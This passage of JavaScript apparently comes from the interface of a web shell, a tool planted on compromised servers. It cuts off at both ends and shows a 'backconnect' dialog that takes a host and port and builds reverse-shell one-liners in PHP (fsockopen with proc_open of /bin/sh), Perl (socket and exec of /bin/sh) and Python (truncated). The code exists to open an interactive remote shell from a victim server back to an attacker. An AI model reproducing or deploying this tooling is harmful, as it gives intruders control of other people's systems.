 }
    });
}

// === BACKCONNECT ===
function showBackconnectModal() {
    document.getElementById('bcHost').value = '';
    document.getElementById('bcPort').value = '';
    document.getElementById('bcType').value = 'php';
    document.getElementById('bcResult').style.display = 'none';
    updateBcPreview();
    document.getElementById('backconnectModal').classList.remove('hidden');
    setTimeout(function() { document.getElementById('bcHost').focus(); }, 100);
}
function updateBcPreview() {
    var host = document.getElementById('bcHost').value.trim() || 'HOST';
    var port = document.getElementById('bcPort').value.trim() || 'PORT';
    var type = document.getElementById('bcType').value;
    var cmds = {
        php: 'fsockopen("' + host + '", ' + port + ') + proc_open("/bin/sh -i")',
        perl: "perl -e 'use Socket;$i=\"" + host + "\";$p=" + port + ";socket(S,PF_INET,SOCK_STREAM,...);exec(\"/bin/sh -i\");'",
        python: "python3 -c 'import socket,subprocess,os;s.connect((\""